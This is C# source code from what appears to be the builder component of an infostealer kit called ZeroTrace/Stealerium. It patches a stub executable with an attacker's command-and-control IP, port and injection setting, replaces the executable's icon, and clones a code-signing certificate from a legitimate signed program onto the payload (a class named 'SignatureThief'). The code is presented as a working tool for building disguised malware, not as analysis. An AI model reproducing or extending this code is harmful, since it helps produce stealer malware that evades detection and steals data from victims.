        private void ExecuteResCommand(string arguments)
        {
            ProcessStartInfo processInfo = new ProcessStartInfo();
            processInfo.FileName = "res.exe";
            processInfo.Arguments = arguments;
            processInfo.CreateNoWindow = true;
            processInfo.UseShellExecute = false;
            processInfo.RedirectStandardError = true;

            Process process = new Process();
            process.StartInfo = processInfo;
            process.Start();

            process.WaitForExit();

            string errorOutput = process.StandardError.ReadToEnd();
            if (!string.IsNullOrEmpty(errorOutput))
            {
                throw new Exception($"res.exe error: {errorOutput}");
            }
        }

        private void simpleButton15_Click(object sender, EventArgs e)
        {
            // choosing exe to steal it's signature
            try
            {
                using (OpenFileDialog openFileDialog = new OpenFileDialog())
                {
                    openFileDialog.Title = "Select Executable File";
                    openFileDialog.Filter = "Executable Files (*.exe)|*.exe";

                    if (openFileDialog.ShowDialog() == DialogResult.OK)
                    {
                        string exePath = openFileDialog.FileName;
                        textEdit8.Text = exePath;

                
                    }
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show("Error selecting executable: " + ex.Message);
            }
        }
    }
}

namespace ZeroTrace.Helper
{
    public static class IconInjector
    {
        // Basically, you can change icons with the UpdateResource api call.
        // When you make the call you say "I'm updating an icon", and you send the icon data.
        // The main problem is that ICO files store the icons in one set of structures, and exe/dll files store them in
        // another set of structures. So you have to translate between the two -- you can't just load the ICO file as
        // bytes and send them with the UpdateResource api call.

        [SuppressUnmanagedCodeSecurity()]
        private class NativeMethods
        {
            [DllImport("kernel32")]
            public static extern IntPtr BeginUpdateResource(string fileName,
                [MarshalAs(UnmanagedType.Bool)] bool deleteExistingResources);

            [DllImport("kernel32")]
            [return: MarshalAs(UnmanagedType.Bool)]
            public static extern bool UpdateResource(IntPtr hUpdate, IntPtr type, IntPtr name, short language,
                [MarshalAs(UnmanagedType.LPArray, SizeParamIndex = 5)] byte[] data, int dataSize);

            [DllImport("kernel32")]
            [return: MarshalAs(UnmanagedType.Bool)]
            public static extern bool EndUpdateResource(IntPtr hUpdate, [MarshalAs(UnmanagedType.Bool)] bool discard);
        }

        // The first structure in an ICO file lets us know how many images are in the file.
        [StructLayout(LayoutKind.Sequential)]
        private struct ICONDIR
        {
            // Reserved, must be 0
            public ushort Reserved;
            // Resource type, 1 for icons.
            public ushort Type;
            // How many images.
            public ushort Count;
            // The native structure has an array of ICONDIRENTRYs as a final field.
        }

        // Each ICONDIRENTRY describes one icon stored in the ico file. The offset says where the icon image data
        // starts in the file. The other fields give the information required to turn that image data into a valid
        // bitmap.
        [StructLayout(LayoutKind.Sequential)]
        private struct ICONDIRENTRY
        {
            /// <summary>
            /// The width, in pixels, of the image.
            /// </summary>
            public byte Width;
            /// <summary>
            /// The height, in pixels, of the image.
            /// </summary>
            public byte Height;
            /// <summary>
            /// The number of colors in the image; (0 if >= 8bpp)
            /// </summary>
            public byte ColorCount;
            /// <summary>
            /// Reserved (must be 0).
            /// </summary>
            public byte Reserved;
            /// <summary>
            /// Color planes.
            /// </summary>
            public ushort Planes;
            /// <summary>
            /// Bits per pixel.
            /// </summary>
            public ushort BitCount;
            /// <summary>
            /// The length, in bytes, of the pixel data.
            /// </summary>
            public int BytesInRes;
            /// <summary>
            /// The offset in the file where the pixel data starts.
            /// </summary>
            public int ImageOffset;
        }

        // Each image is stored in the file as an ICONIMAGE structure:
        //typdef struct
        //{
        //   BITMAPINFOHEADER   icHeader;      // DIB header
        //   RGBQUAD         icColors[1];   // Color table
        //   BYTE            icXOR[1];      // DIB bits for XOR mask
        //   BYTE            icAND[1];      // DIB bits for AND mask
        //} ICONIMAGE, *LPICONIMAGE;


        [StructLayout(LayoutKind.Sequential)]
        private struct BITMAPINFOHEADER
        {
            public uint Size;
            public int Width;
            public int Height;
            public ushort Planes;
            public ushort BitCount;
            public uint Compression;
            public uint SizeImage;
            public int XPelsPerMeter;
            public int YPelsPerMeter;
            public uint ClrUsed;
            public uint ClrImportant;
        }

        // The icon in an exe/dll file is stored in a very similar structure:
        [StructLayout(LayoutKind.Sequential, Pack = 2)]
        private struct GRPICONDIRENTRY
        {
            public byte Width;
            public byte Height;
            public byte ColorCount;
            public byte Reserved;
            public ushort Planes;
            public ushort BitCount;
            public int BytesInRes;
            public ushort ID;
        }

        public static void InjectIcon(string exeFileName, string iconFileName)
        {
            InjectIcon(exeFileName, iconFileName, 1, 1);
        }

        public static void InjectIcon(string exeFileName, string iconFileName, uint iconGroupID, uint iconBaseID)
        {
            const uint RT_ICON = 3u;
            const uint RT_GROUP_ICON = 14u;
            IconFile iconFile = IconFile.FromFile(iconFileName);
            var hUpdate = NativeMethods.BeginUpdateResource(exeFileName, false);
            var data = iconFile.CreateIconGroupData(iconBaseID);
            NativeMethods.UpdateResource(hUpdate, new IntPtr(RT_GROUP_ICON), new IntPtr(iconGroupID), 0, data,
                data.Length);
            for (int i = 0; i <= iconFile.ImageCount - 1; i++)
            {
                var image = iconFile.ImageData(i);
                NativeMethods.UpdateResource(hUpdate, new IntPtr(RT_ICON), new IntPtr(iconBaseID + i), 0, image,
                    image.Length);
            }
            NativeMethods.EndUpdateResource(hUpdate, false);
        }

        private class IconFile
        {
            private ICONDIR iconDir = new ICONDIR();
            private ICONDIRENTRY[] iconEntry;

            private byte[][] iconImage;

            public int ImageCount
            {
                get { return iconDir.Count; }
            }

            public byte[] ImageData(int index)
            {
                return iconImage[index];
            }

            public static IconFile FromFile(string filename)
            {
                IconFile instance = new IconFile();
                // Read all the bytes from the file.
                byte[] fileBytes = System.IO.File.ReadAllBytes(filename);
                // First struct is an ICONDIR
                // Pin the bytes from the file in memory so that we can read them.
                // If we didn't pin them then they could move around (e.g. when the
                // garbage collector compacts the heap)
                GCHandle pinnedBytes = GCHandle.Alloc(fileBytes, GCHandleType.Pinned);
                // Read the ICONDIR
                instance.iconDir = (ICONDIR)Marshal.PtrToStructure(pinnedBytes.AddrOfPinnedObject(), typeof(ICONDIR));
                // which tells us how many images are in the ico file. For each image, there's a ICONDIRENTRY, and associated pixel data.
                instance.iconEntry = new ICONDIRENTRY[instance.iconDir.Count];
                instance.iconImage = new byte[instance.iconDir.Count][];
                // The first ICONDIRENTRY will be immediately after the ICONDIR, so the offset to it is the size of ICONDIR
                int offset = Marshal.SizeOf(instance.iconDir);
                // After reading an ICONDIRENTRY we step forward by the size of an ICONDIRENTRY            
                var iconDirEntryType = typeof(ICONDIRENTRY);
                var size = Marshal.SizeOf(iconDirEntryType);
                for (int i = 0; i <= instance.iconDir.Count - 1; i++)
                {
                    // Grab the structure.
                    var entry =
                        (ICONDIRENTRY)
                            Marshal.PtrToStructure(new IntPtr(pinnedBytes.AddrOfPinnedObject().ToInt64() + offset),
                                iconDirEntryType);
                    instance.iconEntry[i] = entry;
                    // Grab the associated pixel data.
                    instance.iconImage[i] = new byte[entry.BytesInRes];
                    Buffer.BlockCopy(fileBytes, entry.ImageOffset, instance.iconImage[i], 0, entry.BytesInRes);
                    offset += size;
                }
                pinnedBytes.Free();
                return instance;
            }

            public byte[] CreateIconGroupData(uint iconBaseID)
            {
                // This will store the memory version of the icon.
                int sizeOfIconGroupData = Marshal.SizeOf(typeof(ICONDIR)) +
                                          Marshal.SizeOf(typeof(GRPICONDIRENTRY)) * ImageCount;
                byte[] data = new byte[sizeOfIconGroupData];
                var pinnedData = GCHandle.Alloc(data, GCHandleType.Pinned);
                Marshal.StructureToPtr(iconDir, pinnedData.AddrOfPinnedObject(), false);
                var offset = Marshal.SizeOf(iconDir);
                for (int i = 0; i <= ImageCount - 1; i++)
                {
                    GRPICONDIRENTRY grpEntry = new GRPICONDIRENTRY();
                    BITMAPINFOHEADER bitmapheader = new BITMAPINFOHEADER();
                    var pinnedBitmapInfoHeader = GCHandle.Alloc(bitmapheader, GCHandleType.Pinned);
                    Marshal.Copy(ImageData(i), 0, pinnedBitmapInfoHeader.AddrOfPinnedObject(),
                        Marshal.SizeOf(typeof(BITMAPINFOHEADER)));
                    pinnedBitmapInfoHeader.Free();
                    grpEntry.Width = iconEntry[i].Width;
                    grpEntry.Height = iconEntry[i].Height;
                    grpEntry.ColorCount = iconEntry[i].ColorCount;
                    grpEntry.Reserved = iconEntry[i].Reserved;
                    grpEntry.Planes = bitmapheader.Planes;
                    grpEntry.BitCount = bitmapheader.BitCount;
                    grpEntry.BytesInRes = iconEntry[i].BytesInRes;
                    grpEntry.ID = Convert.ToUInt16(iconBaseID + i);
                    Marshal.StructureToPtr(grpEntry, new IntPtr(pinnedData.AddrOfPinnedObject().ToInt64() + offset),
                        false);
                    offset += Marshal.SizeOf(typeof(GRPICONDIRENTRY));
                }
                pinnedData.Free();
                return data;
            }
        }
    }
}
namespace Stealerium.Builder
{


    internal sealed class Build
    {



        private static AssemblyDefinition ReadStub(string stubPath)
        {
            if (!File.Exists(stubPath))
                throw new FileNotFoundException("Stub file not found.", stubPath);

            return AssemblyDefinition.ReadAssembly(stubPath);
        }

        private static void WriteStub(AssemblyDefinition definition, string outputPath)
        {
            definition.Write(outputPath);
        }





        private static void UpdateResource(string resourceName, string newContent, AssemblyDefinition assembly)
        {
            // Find the existing resource by name
            var existingResource = assembly.MainModule.Resources.OfType<EmbeddedResource>()
                                    .FirstOrDefault(r => r.Name.Equals(resourceName));

            if (existingResource != null)
            {
                // Remove the existing resource
                assembly.MainModule.Resources.Remove(existingResource);
            }

            // Add the new resource
            var newResource = new EmbeddedResource(resourceName, Mono.Cecil.ManifestResourceAttributes.Public, Encoding.UTF8.GetBytes(newContent));
            assembly.MainModule.Resources.Add(newResource);
        }

        public static void UpdateIPAndPort(string newIP, string newPort, string injValue, AssemblyDefinition assembly)
        {
            // Remove and add the IP and Port resources
            UpdateResource("ZeroTrace.Resources.ip.txt", newIP, assembly);
            UpdateResource("ZeroTrace.Resources.port.txt", newPort, assembly);
            // Add the injection resource
            UpdateResource("ZeroTrace.Resources.inj.txt", injValue, assembly);
        }


        //public static void ModifyObfuscatedAssembly(string newIP, string newPort, string outputPath)
        //{
        //    try
        //    {
        //        string stubPath = Environment.CurrentDirectory + "\\Stub\\DestinyClientObf.exe";

        //        Console.WriteLine(stubPath);
        //        Console.ReadLine();
        //        // Read the stub assembly
        //        var assembly = ReadStub(stubPath);

        //        // Update the IP and Port resources
        //        UpdateIPAndPort(newIP, newPort, assembly);

        //        // Write the modified assembly to a file
        //        WriteStub(assembly, outputPath);
        //    }
        //    catch (Exception ex)
        //    {
        //        throw new Exception($"Failed to modify assembly: {ex.Message}");
        //    }
        //}


        public static void ModifyAndSaveAssembly(string newIP, string newPort, string injValue, string outputPath)
        {
            try
            {
                string stubPath = Environment.CurrentDirectory + "\\Stub\\ZeroStub.exe";
                Console.WriteLine(stubPath);
                Console.ReadLine();
                // Read the stub assembly
                var assembly = ReadStub(stubPath);
                // Update the IP, Port and injection setting resources
                UpdateIPAndPort(newIP, newPort, injValue, assembly);
                // Write the modified assembly to a file
                WriteStub(assembly, outputPath);
            }
            catch (Exception ex)
            {
                throw new Exception($"Failed to modify assembly: {ex.Message}");
            }
        }
    }

    }

    public static class LanguageSelector
{
    // Static field to store the selected language
    public static string SelectedLanguage { get; set; } = "English";
}

public class SignatureThief
{
    public static bool CloneSignature(string sourceFile, string targetFile, string outputFile)
    {
        try
        {
            // First, check if source file has a signature
            PEFileInfo sourceInfo = GetPEFileInfo(sourceFile);
            if (sourceInfo.CertLOC == 0 || sourceInfo.CertSize == 0)
            {
                Console.WriteLine($"Source file {sourceFile} is not signed!");
                return false;
            }

            // Extract certificate from source file
            byte[] cert;
            using (FileStream fs = new FileStream(sourceFile, FileMode.Open, FileAccess.Read))
            {
                fs.Seek(sourceInfo.CertLOC, SeekOrigin.Begin);
                cert = new byte[sourceInfo.CertSize];
                fs.Read(cert, 0, (int)sourceInfo.CertSize);
            }

            // Get info about target file
            PEFileInfo targetInfo = GetPEFileInfo(targetFile);

            // Create output file (copy of target)
            File.Copy(targetFile, outputFile, true);

            // Read entire target file into memory
            byte[] targetContent;
            using (FileStream fs = new FileStream(targetFile, FileMode.Open, FileAccess.Read))
            {
                targetContent = new byte[fs.Length];
                fs.Read(targetContent, 0, (int)fs.Length);
            }

            // Open output file for writing
            using (FileStream fs = new FileStream(outputFile, FileMode.Create, FileAccess.Write))
            {
                // First write the entire target file content
                fs.Write(targetContent, 0, targetContent.Length);

                // Now go back and update the cert table location
                fs.Seek(targetInfo.CertTableLOC, SeekOrigin.Begin);

                // Write the pointer to cert (file length)
                fs.Write(BitConverter.GetBytes((uint)targetContent.Length), 0, 4);

                // Write the cert size
                fs.Write(BitConverter.GetBytes((uint)cert.Length), 0, 4);

                // Append the certificate at the end
                fs.Seek(0, SeekOrigin.End);
                fs.Write(cert, 0, cert.Length);
            }

            Console.WriteLine($"Successfully cloned signature to {outputFile}");
            return true;
        }
        catch (Exception ex)
        {
            Console.WriteLine($"Error cloning signature: {ex.Message}");
            File.WriteAllText("sigthief_error.log", $"Error: {ex.Message}\n{ex.StackTrace}");
            return false;
        }
    }

    private static PEFileInfo GetPEFileInfo(string exePath)
    {
        PEFileInfo info = new PEFileInfo();

        using (FileStream fs = new FileStream(exePath, FileMode.Open, FileAccess.Read))
        using (BinaryReader reader = new BinaryReader(fs))
        {
            // Get PE header offset (e_lfanew)
            fs.Seek(0x3C, SeekOrigin.Begin);
            info.PEHeaderLocation = reader.ReadUInt32();

            // Move to PE header
            fs.Seek(info.PEHeaderLocation, SeekOrigin.Begin);
            uint peSignature = reader.ReadUInt32(); // "PE\0\0"

            // Calculate start of COFF header
            uint coffStart = info.PEHeaderLocation + 4;

            // Read COFF fields
            fs.Seek(coffStart, SeekOrigin.Begin);
            ushort machine = reader.ReadUInt16();

            fs.Seek(coffStart + 2, SeekOrigin.Begin);
            ushort numberOfSections = reader.ReadUInt16();
            uint timeDateStamp = reader.ReadUInt32();

            fs.Seek(coffStart + 16, SeekOrigin.Begin);
            ushort sizeOfOptionalHeader = reader.ReadUInt16();
            ushort characteristics = reader.ReadUInt16();

            // Calculate start of optional header
            uint optionalHeaderStart = coffStart + 20;

            // Read PE format type (PE32 or PE32+)
            fs.Seek(optionalHeaderStart, SeekOrigin.Begin);
            ushort magic = reader.ReadUInt16();

            // Read all fields one by one to ensure proper offsets
            byte majorLinkerVersion = reader.ReadByte();
            byte minorLinkerVersion = reader.ReadByte();
            uint sizeOfCode = reader.ReadUInt32();
            uint sizeOfInitializedData = reader.ReadUInt32();
            uint sizeOfUninitializedData = reader.ReadUInt32();
            uint addressOfEntryPoint = reader.ReadUInt32();
            uint baseOfCode = reader.ReadUInt32();

            // PE32 has BaseOfData, PE32+ doesn't
            uint baseOfData = 0;
            if (magic != 0x20B) // Not PE32+
            {
                baseOfData = reader.ReadUInt32();
            }

            // Skip imageBase (different size based on format)
            if (magic == 0x20B) // PE32+
            {
                ulong imageBase = reader.ReadUInt64();
            }
            else
            {
                uint imageBase = reader.ReadUInt32();
            }

            // Continue reading fields
            uint sectionAlignment = reader.ReadUInt32();
            uint fileAlignment = reader.ReadUInt32();
            ushort majorOSVersion = reader.ReadUInt16();
            ushort minorOSVersion = reader.ReadUInt16();
            ushort majorImageVersion = reader.ReadUInt16();
            ushort minorImageVersion = reader.ReadUInt16();
            ushort majorSubsystemVersion = reader.ReadUInt16();
            ushort minorSubsystemVersion = reader.ReadUInt16();
            uint win32VersionValue = reader.ReadUInt32();
            uint sizeOfImage = reader.ReadUInt32();
            uint sizeOfHeaders = reader.ReadUInt32();
            uint checkSum = reader.ReadUInt32();
            ushort subsystem = reader.ReadUInt16();
            ushort dllCharacteristics = reader.ReadUInt16();

            // Skip Stack/Heap sizes (different sizes based on format)
            if (magic == 0x20B) // PE32+
            {
                ulong sizeOfStackReserve = reader.ReadUInt64();
                ulong sizeOfStackCommit = reader.ReadUInt64();
                ulong sizeOfHeapReserve = reader.ReadUInt64();
                ulong sizeOfHeapCommit = reader.ReadUInt64();
            }
            else
            {
                uint sizeOfStackReserve = reader.ReadUInt32();
                uint sizeOfStackCommit = reader.ReadUInt32();
                uint sizeOfHeapReserve = reader.ReadUInt32();
                uint sizeOfHeapCommit = reader.ReadUInt32();
            }

            uint loaderFlags = reader.ReadUInt32();
            uint numberOfRvaAndSizes = reader.ReadUInt32();

            // Now read data directories
            // Export Table
            uint exportTableRVA = reader.ReadUInt32();
            uint exportTableSize = reader.ReadUInt32();

            // Import Table
            uint importTableRVA = reader.ReadUInt32();
            uint importTableSize = reader.ReadUInt32();

            // Resource Table
            ulong resourceTable = reader.ReadUInt64();

            // Exception Table
            ulong exceptionTable = reader.ReadUInt64();

            // Save current position, which is where the Certificate Table is
            info.CertTableLOC = (uint)fs.Position;

            // Read Certificate Table location and size
            info.CertLOC = reader.ReadUInt32();
            info.CertSize = reader.ReadUInt32();
        }

        return info;
    }

    private class PEFileInfo
    {
        public uint PEHeaderLocation { get; set; }
        public uint CertTableLOC { get; set; }
        public uint CertLOC { get; set; }
        public uint CertSize { get; set; }
    }
}